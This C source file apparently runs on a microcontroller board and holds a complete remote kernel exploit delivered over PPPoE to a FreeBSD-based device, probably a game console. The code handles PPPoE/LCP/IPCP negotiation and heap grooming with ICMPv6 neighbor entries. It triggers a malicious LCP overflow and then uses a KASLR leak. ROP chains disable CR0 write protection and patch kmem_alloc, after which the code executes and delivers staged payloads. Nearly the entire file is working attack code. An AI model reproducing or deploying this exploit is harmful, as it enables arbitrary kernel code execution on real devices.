#include "exploit.h"


void updateSourceMac(uint64_t value) {
    union {
        uint64_t u64;
        uint8_t u8[8];
    } planted;

    planted.u64 = value & 0xffffffffffffULL;
    planted.u64 = htole64(planted.u64);

    memcpy(source_mac, planted.u8, 6);
}

uint64_t kdlsym(uint64_t addr) {
    return kaslr_offset + addr;
}

void build_first_rop(uint8_t *rop) {
        // RDI = RBX - 0x800
    V64(rop, 0, kdlsym(POP_R12_RET));
    V64(rop, 0x8, kdlsym(POP_RBP_RET));
    V64(rop, 0x10, kdlsym(MOV_RDI_RBX_CALL_R12));
    V64(rop, 0x18, kdlsym(POP_RCX_RET));
    V64(rop, 0x20, -0x800);
    V64(rop, 0x28, kdlsym(ADD_RDI_RCX_RET));

    // RSI += len(fake_lle + rop)
    V64(rop, 0x30, kdlsym(POP_RDX_RET));
    V64(rop, 0x38, -(0xE0 + 0xA8));  // 0xE0 FIXED FAKE_LLE SIZE
    V64(rop, 0x40, kdlsym(SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET));
    V64(rop, 0x48, 0xDEADBEEF);

    // RDX = len(rop2 + stage1)
    V64(rop, 0x50, kdlsym(POP_RDX_RET));
    V64(rop, 0x58, 0x198 + sizeof(stage1_bin)); // 0x198 FIXED ROP2 SIZE

    // Call memcpy
    V64(rop, 0x60, kdlsym(MEMCPY));

    // Stack pivot
    V64(rop, 0x68, kdlsym(POP_RAX_RET));
    V64(rop, 0x70, kdlsym(POP_RBP_RET));
    V64(rop, 0x78, kdlsym(MOV_RSI_RBX_CALL_RAX));
    V64(rop, 0x80, kdlsym(POP_RDX_RET));
    V64(rop, 0x88, 0x800 + 0x20);
    V64(rop, 0x90, kdlsym(SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET));
    V64(rop, 0x98, 0xDEADBEEF);
    V64(rop, 0xA0, kdlsym(LEA_RSP_RSI_20_REPZ_RET));
}

void build_second_rop(uint8_t *rop) {
    // setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
    V64(rop, 0x00, kdlsym(POP_RDI_RET));
    V64(rop, 0x08, IDT_UD);
    V64(rop, 0x10, kdlsym(POP_RSI_RET));
    V64(rop, 0x18, kdlsym(ADD_RSP_28_POP_RBP_RET));
    V64(rop, 0x20, kdlsym(POP_RDX_RET));
    V64(rop, 0x28, SDT_SYSIGT);
    V64(rop, 0x30, kdlsym(POP_RCX_RET));
    V64(rop, 0x38, SEL_KPL);
    V64(rop, 0x40, kdlsym(POP_R8_POP_RBP_RET));
    V64(rop, 0x48, 0);
    V64(rop, 0x50, 0xDEADBEEF);
    V64(rop, 0x58, kdlsym(SETIDT));

    // Disable write protection
    V64(rop, 0x60, kdlsym(POP_RSI_RET));
    V64(rop, 0x68, (CR0_ORI) & ~(CR0_WP));
    V64(rop, 0x70, kdlsym(MOV_CR0_RSI_UD2_MOV_EAX_1_RET));

    // Enable RWX in kmem_alloc
    V64(rop, 0x78, kdlsym(POP_RAX_RET));
    V64(rop, 0x80, VM_PROT_ALL);
    V64(rop, 0x88, kdlsym(POP_RCX_RET));
    V64(rop, 0x90, kdlsym(KMEM_ALLOC_PATCH1));
    V64(rop, 0x98, kdlsym(MOV_BYTE_PTR_RCX_AL_RET));
    V64(rop, 0xa0, kdlsym(POP_RCX_RET));
    V64(rop, 0xa8, kdlsym(KMEM_ALLOC_PATCH2));
    V64(rop, 0xb0, kdlsym(MOV_BYTE_PTR_RCX_AL_RET));

    // Restore write protection
    V64(rop, 0xb8, kdlsym(POP_RSI_RET));
    V64(rop, 0xc0, CR0_ORI);
    V64(rop, 0xc8, kdlsym(MOV_CR0_RSI_UD2_MOV_EAX_1_RET));

    // kmem_alloc(*kernel_map, PAGE_SIZE)

    // RDI = *kernel_map
    V64(rop, 0xd0, kdlsym(POP_RAX_RET));
    V64(rop, 0xd8, kdlsym(RET));
    V64(rop, 0xe0, kdlsym(POP_RDI_RET));
    V64(rop, 0xe8, kdlsym(KERNEL_MAP));
    V64(rop, 0xf0, kdlsym(MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX));
    V64(rop, 0xf8, 0xDEADBEEF);

    // RSI = PAGE_SIZE
    V64(rop, 0x100, kdlsym(POP_RSI_RET));
    V64(rop, 0x108, PAGE_SIZE);

    // Call kmem_alloc
    V64(rop, 0x110, kdlsym(KMEM_ALLOC));

    // R14 = RAX
    V64(rop, 0x118, kdlsym(POP_R8_POP_RBP_RET));
    V64(rop, 0x120, kdlsym(POP_RBP_RET));
    V64(rop, 0x128, 0xDEADBEEF);
    V64(rop, 0x130, kdlsym(MOV_R14_RAX_CALL_R8));

    // memcpy(R14, stage1, len(stage1))

    // RDI = R14
    V64(rop, 0x138, kdlsym(POP_R12_RET));
    V64(rop, 0x140, kdlsym(POP_RBP_RET));
    V64(rop, 0x148, kdlsym(MOV_RDI_R14_CALL_R12));

    // RSI = RSP + len(rop) - rop_rsp_pos
    V64(rop, 0x150, kdlsym(PUSH_RSP_POP_RSI_RET));
    V64(rop, 0x158, kdlsym(POP_RDX_RET));
    V64(rop, 0x160, -(0x198 - 0x158));
    V64(rop, 0x168, kdlsym(SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET));
    V64(rop, 0x170, 0xDEADBEEF);

    // RDX = len(stage1)
    V64(rop, 0x178, kdlsym(POP_RDX_RET));
    V64(rop, 0x180, sizeof(stage1_bin));

    // Call memcpy
    V64(rop, 0x188, kdlsym(MEMCPY));

    // Jump into stage1
    V64(rop, 0x190, kdlsym(JMP_R14));
}

uint16_t build_fake_lle(uint8_t **fake_lle) {
    // First gadget - must be a valid MAC address
    // Upper bytes are encoded with SESSION_ID
    updateSourceMac(kdlsym(FIRST_GADGET));

    // Fake in6_llentry
    uint16_t size = 0xE0 * sizeof(uint8_t);
    *fake_lle = malloc(size);
    if (*fake_lle == NULL) {
        printf("Error: Failed to alloc memory for build_fake_lle\n");
        return RETURN_FAIL;
    }
    memset(*fake_lle, 0, size);

    // lle_next
    // Third gadget
    V64(*fake_lle, 0, kdlsym(POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10)); // le_next
    V64(*fake_lle, 0x8, ZERO); // le_prev

    // lle_lock
    // Fourth gadget
    V64(*fake_lle, 0x10, kdlsym(LEA_RSP_RSI_20_REPZ_RET)); // lo_name
    V32(*fake_lle, 0x18, RW_INIT_FLAGS | LO_DUPOK); // lo_flags
    V32(*fake_lle, 0x1C, 0); // lo_data
    // Fifth gadget
    V64(*fake_lle, 0x20, kdlsym(ADD_RSP_B0_POP_RBP_RET)); // lo_witness
    V64(*fake_lle, 0x28, RW_UNLOCKED); // rw_lock

    V64(*fake_lle, 0x30, pppoe_softc + PPPOE_SOFTC_SC_DEST - LLTABLE_LLTFREE);  // lle_tbl
    V64(*fake_lle, 0x38, ZERO);  // lle_head
    V64(*fake_lle, 0x40, ZERO);  // lle_free
    V64(*fake_lle, 0x48, ZERO);  // la_hold
    V32(*fake_lle, 0x50, 0); // la_numheld
    V32(*fake_lle, 0x54, 0); // pad
    V64(*fake_lle, 0x58, 0);  // la_expire
    V16(*fake_lle, 0x60, LLE_STATIC | LLE_EXCLUSIVE);  // la_flags
    V16(*fake_lle, 0x62, 0);  // la_asked
    V16(*fake_lle, 0x64, 0);  // la_preempt
    V16(*fake_lle, 0x66, 0);  // ln_byhint
    V16(*fake_lle, 0x68, ND6_LLINFO_NOSTATE);  // ln_state
    V16(*fake_lle, 0x6A, 0);  // ln_router
    V32(*fake_lle, 0x6C, 0); // pad
    V64(*fake_lle, 0x70, 0x7fffffffffffffff);  // ln_ntick
    V32(*fake_lle, 0x78, 0);  // lle_refcnt
    V32(*fake_lle, 0x7C, 0); // pad
    V64BE(*fake_lle, 0x80, 0x414141414141);  // ll_addr

    // lle_timer
    V64(*fake_lle, 0x88, 0);  // sle
    V64(*fake_lle, 0x90, 0);  // tqe
    V32(*fake_lle, 0x98, 0);  // c_time
    V32(*fake_lle, 0x9C, 0);  // pad
    V64(*fake_lle, 0xA0, ZERO);  // c_arg
    V64(*fake_lle, 0xA8, ZERO);  // c_func
    V64(*fake_lle, 0xB0, ZERO);  // c_lock
    V32(*fake_lle, 0xB8, CALLOUT_RETURNUNLOCKED);  // c_flags
    V32(*fake_lle, 0xBC, 0);  // c_cpu

    // l3_addr6
    V8(*fake_lle, 0xC0, SOCKADDR_IN6_SIZE);  // sin6_len
    V8(*fake_lle, 0xC1, AF_INET6);  // sin6_family
    V16(*fake_lle, 0xC2, 0);  // sin6_port
    V32(*fake_lle, 0xC4, 0);  // sin6_flowinfo
    // sin6_addr
    V64BE(*fake_lle, 0xC8, 0xfe80000100000000);
    V64BE(*fake_lle, 0xD0, SIN6_ADDR);
    V32(*fake_lle, 0xD8, 0);  // sin6_scope_id

    // pad
    V32(*fake_lle, 0xDC, 0);

    // Second gadget
    V64(*fake_lle, SECOND_GADGET_OFF, kdlsym(PUSH_RBP_JMP_QWORD_PTR_RSI));

    // First ROP chain
    uint8_t rop[0xA8];
    build_first_rop(rop);

    // Second ROP chain
    uint8_t rop2[0x198];
    build_second_rop(rop2);

    // Add new data
    uint16_t offset = size;
    size += sizeof(rop);

    uint8_t *tmp = realloc(*fake_lle, size);
    if (tmp == NULL) {
        printf("Error: Failed to realloc memory for rop chain\n");
        return RETURN_FAIL;
    }
    *fake_lle = tmp;
    memcpy(*fake_lle + offset, rop, sizeof(rop));

    offset = size;
    size += sizeof(rop2);
    tmp = realloc(*fake_lle, size);
    if (tmp == NULL) {
        printf("Error: Failed to realloc memory for second rop chain\n");
        return RETURN_FAIL;
    }
    *fake_lle = tmp;
    memcpy(*fake_lle + offset, rop2, sizeof(rop2));

    offset = size;
    size += sizeof(stage1_bin);
    tmp = realloc(*fake_lle, size);
    if (tmp == NULL) {
        printf("Error: Failed to realloc memory for stage1_bin\n");
        return RETURN_FAIL;
    }
    *fake_lle = tmp;
    memcpy(*fake_lle + offset, stage1_bin, sizeof(stage1_bin));

    return size;
}

uint16_t build_fake_ifnet(uint8_t **fake_ifnet) {
    // Leak address
    // Upper bytes are encoded with SESSION_ID
    updateSourceMac(pppoe_softc + 0x07);

    // // Fake ifnet
    uint16_t size = 0x4e0 * sizeof(uint8_t);
    *fake_ifnet = malloc(size);
    if (fake_ifnet == NULL)
        printf("Error: Failed to alloc memory for build_fake_ifnet\n");
    memset(*fake_ifnet, 'A', size);

    V64(*fake_ifnet, 0x48, ZERO);     // if_addrhead
    V16(*fake_ifnet, 0x70, 0x0001);   // if_index
    V8(*fake_ifnet, 0xa0, IFT_ETHER); // ifi_type
    V8(*fake_ifnet, 0xa1, 0);         // ifi_physical
    V8(*fake_ifnet, 0xa2, 0x8 + 0x1); // ifi_addrlen
    V64(*fake_ifnet, 0x1b8, pppoe_softc + PPPOE_SOFTC_SC_DEST); // if_addr
    V64(*fake_ifnet, 0x428, pppoe_softc + 0x10 - 0x8);          // nd_ifinfo

    // if_afdata_lock
    V64(*fake_ifnet, 0x480, ZERO);          // lo_name
    V32(*fake_ifnet, 0x488, RW_INIT_FLAGS); // lo_flags
    V32(*fake_ifnet, 0x48c, 0);             // lo_data
    V64(*fake_ifnet, 0x490, ZERO);          // lo_witness
    V64(*fake_ifnet, 0x498, RW_UNLOCKED);   // rw_lock

    // if_addr_mtx
    V64(*fake_ifnet, 0x4c0, ZERO);           // lo_name
    V32(*fake_ifnet, 0x4c8, MTX_INIT_FLAGS); // lo_flags
    V32(*fake_ifnet, 0x4cc, 0);              // lo_data
    V64(*fake_ifnet, 0x4d0, ZERO);           // lo_witness
    V64(*fake_ifnet, 0x4d8, MTX_UNOWNED);    // mtx_lock

    return size;
}

uint16_t build_overflow_lle(uint8_t **overflow_lle) {
    // Fake in6_llentry
    uint16_t size = 0x78 * sizeof(uint8_t);
    *overflow_lle = malloc(size);
    if (overflow_lle == NULL)
        printf("Error: Failed to alloc memory for build_overflow_lle\n");
    memset(*overflow_lle, 0, size);

    // lle_next
    V64(*overflow_lle, 0, pppoe_softc + PPPOE_SOFTC_SC_AC_COOKIE); // le_next
    V64(*overflow_lle, 0x8, ZERO); // le_prev

    // lle_lock
    V64(*overflow_lle, 0x10, ZERO); // lo_name
    V32(*overflow_lle, 0x18, RW_INIT_FLAGS | LO_DUPOK); // lo_flags
    V32(*overflow_lle, 0x1c, 0);           // lo_data
    V64(*overflow_lle, 0x20, ZERO);        // lo_witness
    V64(*overflow_lle, 0x28, RW_UNLOCKED); // rw_lock

    V64(*overflow_lle, 0x30, pppoe_softc + PPPOE_SOFTC_SC_AC_COOKIE - LLTABLE_LLTIFP); // lle_tbl
    V64(*overflow_lle, 0x38, ZERO); // lle_head
    V64(*overflow_lle, 0x40, ZERO); // lle_free
    V64(*overflow_lle, 0x48, ZERO); // la_hold
    V32(*overflow_lle, 0x50, 0);    // la_numheld
    V32(*overflow_lle, 0x54, 0);    // pad
    V64(*overflow_lle, 0x58, 0);    // la_expire

    V16(*overflow_lle, 0x60, LLE_EXCLUSIVE);      // la_flags
    V16(*overflow_lle, 0x62, 0);                  // la_asked
    V16(*overflow_lle, 0x64, 0);                  // la_preempt
    V16(*overflow_lle, 0x66, 0);                  // ln_byhint
    V16(*overflow_lle, 0x68, ND6_LLINFO_NOSTATE); // ln_state
    V16(*overflow_lle, 0x6a, 0);                  // ln_router
    V32(*overflow_lle, 0x6c, 0);                  // pad
    V64(*overflow_lle, 0x70, 0x7fffffffffffffff); // ln_ntick

    return size;
}

int ppp_byebye() {
    printf("[*] Sending PADT...\n");
    size = makePADT(packet, target_mac, source_mac);
    ret = sendto(SN, packet, size, 0, 0);
    if (ret < 0) {
        printf("Error: Failed to send packet\n");
        return RETURN_FAIL;
    }
}

int ppp_negotiation(const ppp_negotiation_cb cb) {
    printf("[*] Waiting for PADI...\n");
    waitPacket(isPADI, packet, 100);

    // host_uniq
    memcpy(&pppoe_softc, packet + 28, 8);
    pppoe_softc = htole64(pppoe_softc);
    printf("[+] pppoe_softc: 0x%016llx\n", (unsigned long long)pppoe_softc);

    memcpy(source_mac, SOURCE_MAC, 6);
    memcpy(target_mac, packet + 6, 6);
    printf("[+] target mac: %02x:%02x:%02x:%02x:%02x:%02x\n", target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5], target_mac[6]);

    uint8_t *ac_cookie;
    uint16_t ac_cookie_size = 0;
    if (cb)
        ac_cookie_size = cb(&ac_cookie);
    printf("[+] AC cookie length: %u\n", ac_cookie_size);
    printf("[+] source mac: %02x:%02x:%02x:%02x:%02x:%02x\n", source_mac[0], source_mac[1], source_mac[2], source_mac[3], source_mac[4], source_mac[5], source_mac[6]);

    printf("[*] Sending PADO...\n");
    memset(packet, '\0', sizeof(packet));
    size = makePADO(packet, target_mac, source_mac, ac_cookie, ac_cookie_size, &pppoe_softc, sizeof(uint64_t));
    ret = sendto(SN, packet, size, 0, 0);
    if (ret < 0) {
        printf("Error: Failed to send packet\n");
        return RETURN_FAIL;
    }

    printf("[*] Waiting for PADR...\n");
    waitPacket(isPADR, packet, 100);

    printf("[*] Sending PADS...\n");
    size = makePADS(packet, target_mac, source_mac, &pppoe_softc, sizeof(uint64_t));
    ret = sendto(SN, packet, size, 0, 0);
    if (ret < 0) {
        printf("Error: Failed to send packet\n");
        return RETURN_FAIL;
    }

    return RETURN_SUCCESS;
}

int lcp_negotiation() {
    printf("[*] Sending LCP configure request...\n");
    size = makeLcpReq(packet, target_mac, source_mac);
    ret = sendto(SN, packet, size, 0, 0);
    if (ret < 0) {
        printf("Error: Failed to send packet\n");
        return RETURN_FAIL;
    }

    printf("[*] Waiting for LCP configure ACK...\n");
    waitPacket(isLcpACK, packet, 100);

    printf("[*] Waiting for LCP configure request...\n");
    waitPacket(isLcpConfig, packet, 100);
    uint8_t lcp_id = packet[23];

    printf("[*] Sending LCP configure ACK...\n");
    size = makeLcpACK(packet, target_mac, source_mac, lcp_id);
    ret = sendto(SN, packet, size, 0, 0);
    if (ret < 0) {
        printf("Error: Failed to send packet\n");
        return RETURN_FAIL;
    }

    return RETURN_SUCCESS;
}

int ipcp_negotiation() {
    printf("[*] Sending IPCP configure request...\n");
    size = makeIpcpConfig(packet, target_mac, source_mac);
    ret = sendto(SN, packet, size, 0, 0);
    if (ret < 0) {
        printf("Error: Failed to send packet\n");
        return RETURN_FAIL;
    }

    printf("[*] Waiting for IPCP configure ACK...\n");
    waitPacket(isIpcpACK, packet, 100);

    printf("[*] Waiting for IPCP configure request...\n");
    waitPacket(isIpcpConfigReq, packet, 100);
    uint8_t ipcp_id = packet[23];

    printf("[*] Sending IPCP configure NAK...\n");
    size = makeIpcpNAK(packet, target_mac, source_mac, ipcp_id);
    ret = sendto(SN, packet, size, 0, 0);
    if (ret < 0) {
        printf("Error: Failed to send packet\n");
        return RETURN_FAIL;
    }

    printf("[*] Waiting for IPCP configure request...\n");
    waitPacket(isIpcpConfigReq, packet, 100);
    ipcp_id = packet[23];

    printf("[*] Sending IPCP configure ACK...\n");
    size = makeIpcpACK(packet, target_mac, source_mac, ipcp_id);
    ret = sendto(SN, packet, size, 0, 0);
    if (ret < 0) {
        printf("Error: Failed to send packet\n");
        return RETURN_FAIL;
    }

    return RETURN_SUCCESS;
}

int stage0() {
    CHECK_RET(ppp_negotiation(build_fake_ifnet));
    CHECK_RET(lcp_negotiation());
    CHECK_RET(ipcp_negotiation());

    printf("[*] Waiting for interface to be ready...\n");
    waitPacket(isICMPv6, packet, 100);

    gpio_put(LED_PIN, 1);

    printf("[+] Generate target IPv6 from MAC address\n");
    uint8_t _target_ipv6[16] = {0xfe, 0x80, 0, 0, 0, 0, 0, 0, target_mac[0] ^ 0x02, target_mac[1], target_mac[2], 0xff, 0xfe, target_mac[3], target_mac[4], target_mac[5]};
    memcpy(target_ipv6, _target_ipv6, sizeof(_target_ipv6));
    printIPv6(target_ipv6);

    /* ---------------- Groom Heap ---------------- */
    for (size_t i = 0; i < SPRAY_NUM; i++) {
        if (i % 0x100 == 0) {
            printf("\r[*] Heap grooming...%d%%", 100 * i / SPRAY_NUM);
        }
        uint8_t source_ipv6[16] = {0xfe, 0x80, 0, 0, 0, 0, 0, 0, (i >> 8) & 0xFF, i & 0xFF, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41};

        size = makeIcmpv6Echo(packet, target_mac, source_mac, source_ipv6, target_ipv6);
        ret = sendto(SN, packet, size, 0, 0);
        if (ret < 0) {
            printf("Error: Failed to send packet\n");
            return RETURN_FAIL;
        }

        waitPacket(isICMPv6Ns, packet, 100);

        if (i >= HOLE_START && i % HOLE_SPACE == 0) continue;

        size = makeIcmpv6Na(packet, target_mac, source_mac, source_ipv6, target_ipv6);
        ret = sendto(SN, packet, size, 0, 0);
        if (ret < 0) {
            printf("Error: Failed to send packet\n");
            return RETURN_FAIL;
        }

        if (i % groom_delay == 0) sleep_ms(1);
    }
    printf("\r[+] Heap grooming...done\n");

    return RETURN_SUCCESS;
}

int stage1() {
    uint8_t pinCpu0Packet[15] = {0};
    uint8_t pinCpu0PacketSize = makePinCpu0Packet(pinCpu0Packet, target_mac, source_mac);
    for (int i = 0; i < PIN_NUM; ++i) {
        if (i % 0x100 == 0) {
            printf("\r[*] Pinning to CPU 0...%d%%", 100 * i / PIN_NUM);
        }
        if (sendto(SN, pinCpu0Packet, pinCpu0PacketSize, 0, 0) < 0) {
            printf("Error: Failed to send packet\n");
            return RETURN_FAIL;
        }
        sleep_ms(1);

        // Check echo request and reply
        // if((size = getSn_RX_RSR(SN)) > 0) {
        //     if(size > NET_MAX_BUF) size = NET_MAX_BUF;
        //     ret = recvfrom(SN, packet, size, 0, 0);
        //     if (ret <= 0)
        //         printf("Error: Failed to receive packet: %d\n", ret);
        //     ret = isLcpEchoRequest(packet);
        //     if (ret == RETURN_SUCCESS) {
        //         size = makeLcpEchoReply(packet, target_mac, source_mac);
        //         ret = sendto(SN, packet, size, 0, 0);
        //         if (ret < 0)
        //             printf("Error: Failed to send packet: %d\n", ret);
        //     }
        // }
    }

    printf("\r[+] Pinning to CPU 0...done\n");

    // LCP fails sometimes without the wait
    sleep_ms(wait_after_pin * 1000);

    uint8_t *malicious_lcp;
    uint16_t malicious_lcp_size = build_overflow_lle(&malicious_lcp);
    printf("[*] Sending malicious LCP configure request...\n");
    size = makeMaliciousLcp(packet, target_mac, source_mac, malicious_lcp, malicious_lcp_size);
    ret = sendto(SN, packet, size, 0, 0);
    if (ret < 0) {
        printf("Error: Failed to send packet\n");
        return RETURN_FAIL;
    }

    printf("[*] Waiting for LCP configure reject...\n");
    waitPacket(isLcpReject, packet, 100);

    // Re-negotiate after rejection
    CHECK_RET(lcp_negotiation());
    CHECK_RET(ipcp_negotiation());

    bool corrupted = false;

    for (int i = SPRAY_NUM - 1; i >= 0; --i) {
        if (i % 0x100 == 0) {
            printf("\r[*] Scanning for corrupted object... %x0", 100 * i / SPRAY_NUM);
        }

        if (i >= HOLE_START && i % HOLE_SPACE == 0) {
            continue;
        }
        uint8_t source_ipv6[16] = {0xfe, 0x80, 0, 0, 0, 0, 0, 0, (i >> 8) & 0xFF, i & 0xFF, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41};

        size = makeIcmpv6Echo(packet, target_mac, source_mac, source_ipv6, target_ipv6);
        ret = sendto(SN, packet, size, 0, 0);
        if (ret < 0) {
            printf("Error: Failed to send packet\n");
            return RETURN_FAIL;
        }

        while (1) {
            if (readPacket(packet) == RETURN_FAIL)
                continue;
            if (isICMPv6EchoReply(packet) == RETURN_SUCCESS)
                break;
            else if (isICMPv6Ns(packet) == RETURN_SUCCESS) {
                corrupted = true;
                break;
            }
        }

        if (corrupted) break;

        size = makeIcmpv6Na(packet, target_mac, source_mac, source_ipv6, target_ipv6);
        ret = sendto(SN, packet, size, 0, 0);
        if (ret < 0) {
            printf("Error: Failed to send packet\n");
            return RETURN_FAIL;
        }
        if (i % groom_delay == 0) sleep_ms(1);
    }

    if (!corrupted) {
        printf("\r[-] Scanning for corrupted object...failed.\n");
        return RETURN_FAIL;
    }
    printf("\r[+] Scanning for corrupted object...found\n");
    return RETURN_SUCCESS;
}

int stage2() {
    printf("[*] Defeating KASLR...\n");

    while (1) {
        waitPacket(isICMPv6Ns, packet, 100);
        if (packet[78] == 1 && packet[79] > 1)
            break;
    }

    memcpy(&pppoe_softc_list, packet+81, sizeof(pppoe_softc_list));
    pppoe_softc_list = htole64(pppoe_softc_list);

    printf("[+] pppoe_softc_list: 0x%016llx\n", (unsigned long long)pppoe_softc_list);
    kaslr_offset = pppoe_softc_list - PPPOE_SOFTC_LIST;
    printf("[+] kaslr_offset: 0x%016llx\n", (unsigned long long)kaslr_offset);

    if ((pppoe_softc_list & 0xffffffff00000fff) != (PPPOE_SOFTC_LIST & 0xffffffff00000fff)) {
        printf("[-] Error: Leak is invalid. Wrong firmware?\n");
        return RETURN_FAIL;
    }

    return RETURN_SUCCESS;
}

int stage3() {
    printf("[*] Sending LCP terminate request...\n");
    size = makeLcpTerm(packet, target_mac, source_mac);
    ret = sendto(SN, packet, size, 0, 0);
    if (ret < 0) {
        printf("Error: Failed to send packet\n");
        return RETURN_FAIL;
    }

    CHECK_RET(ppp_negotiation(build_fake_lle));

    uint8_t source_ipv6[16] = {0xfe, 0x80, 0, 0, 0, 0, 0, 0, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41};
    printf("[*] Triggering code execution...\n");
    size = makeIcmpv6Echo(packet, target_mac, source_mac, source_ipv6, target_ipv6);
    ret = sendto(SN, packet, size, 0, 0);
    if (ret < 0) {
        printf("Error: Failed to send packet\n");
        return RETURN_FAIL;
    }

    printf("[*] Waiting for stage1 to resume...\n");
    for (uint8_t i = 0; i <= 3; i++) {
        waitPacket(isLcpConfig, packet, 100);
    }

    printf("[*] Sending PADT...\n");
    size = makePADT(packet, target_mac, source_mac);
    ret = sendto(SN, packet, size, 0, 0);
    if (ret < 0) {
        printf("Error: Failed to send packet\n");
        return RETURN_FAIL;
    }

    CHECK_RET(ppp_negotiation(NULL));
    CHECK_RET(lcp_negotiation());
    CHECK_RET(ipcp_negotiation());

    return RETURN_SUCCESS;
}

int stage4() {
    printf("[*] Sending stage2 payload...\n");

    const uint8_t source_port = 53;
    const uint64_t fragmentSize = 1024;
    uint16_t packet_len = 0;
    uint64_t offset = 0;

    while (offset < sizeof(stage2_bin)) {
        const uint8_t *payload = stage2_bin + offset;
        uint64_t payloadSize = fragmentSize;
        memset(packet, 0, sizeof(packet));
        size = 0;

        // Ethernet
        memcpy(packet, target_mac, 6);
        memcpy(packet+6, SOURCE_MAC, 6);
        packet[12] = 0x08; packet[13] = 0x00;

        // IPV4
        packet[14] = 0x45; packet[15] = 0x00; packet[19] = 0x01;
        packet[22] = 0x40; packet[23] = 0x11;
        memcpy(packet+26, SOURCE_IPV4, 4);
        memcpy(packet+30, TARGET_IPV4, 4);

        memcpy(packet + 34, stage2_bin + offset - 8, payloadSize);

        packet_len = payloadSize + 34;
        uint16_t _offset = htobe16(offset / 8 + (offset != 0)) | htobe16(0x2000);
        if (offset + payloadSize >= sizeof(stage2_bin)) { // last fragment
            _offset = htobe16(offset / 8 + (offset != 0)) & htobe16(0x1FFF);
            payloadSize = sizeof(stage2_bin) - offset;
            packet_len = payloadSize + 42;
            size += 8;
        }
        packet[20] = _offset & 0xFF;
        packet[21] = (_offset >> 8) & 0xFF;
        if (offset != 0)
            packet[21] -= 1;

        size += payloadSize + 20;
        packet[16] = (size >> 8) & 0xFF;
        packet[17] = size & 0xFF;

        // First fragment
        if (offset == 0) { // Set DNS header
            uint16_t total_size = sizeof(stage2_bin) + 8;

            packet[34] = (source_port >> 8) & 0xFF;
            packet[35] = source_port & 0xFF;
            packet[36] = (STAGE2_PORT >> 8) & 0xFF;
            packet[37] = STAGE2_PORT & 0xFF;
            packet[38] = (total_size >> 8) & 0xFF;
            packet[39] = total_size & 0xFF;
            packet[40] = 0; packet[41] = 0;

            memcpy(packet + 42, stage2_bin + offset, payloadSize);
        }

        offset += payloadSize;

        calcIPV4Checksum(packet);

        // Handle Payload2
        

        ret = sendto(SN, packet, packet_len, 0, 0);
        if (ret < 0) {
            printf("Error: Failed to send packet\n");
            return RETURN_FAIL;
        }
    }

    printf("[+] Done!\n");
    gpio_put(LED_PIN, 0);
    return RETURN_SUCCESS;
}

int _run() {
    printf("[+] STAGE 0: Initialization\n");
    CHECK_RET(stage0());

    printf("[+] STAGE 1: Memory corruption\n");
    CHECK_RET(stage1());

    printf("[+] STAGE 2: KASLR defeat\n");
    CHECK_RET(stage2());

    printf("[+] STAGE 3: Remote code execution\n");
    CHECK_RET(stage3());

    printf("[+] STAGE 4: Arbitrary payload execution\n");
    CHECK_RET(stage4());

    return RETURN_SUCCESS;
}

int run() {
    if(socket(SN, Sn_MR_MACRAW, 0, 0) != SN) {
        printf("Error: Failed to open socket: %d\n", ret);
        RETURN_FAIL;
    }

    while (true) {
        int ret = _run();
        if (ret == RETURN_SUCCESS) break;
        sleep_ms(1);
        ppp_byebye();
        if (ret == RETURN_STOP) {
            printf("[+] Stopped\n");
            return RETURN_STOP;
        }
        printf("[*] Retry after 5s...\n\n");
        sleep_ms(5000);
    }

    return RETURN_SUCCESS;
}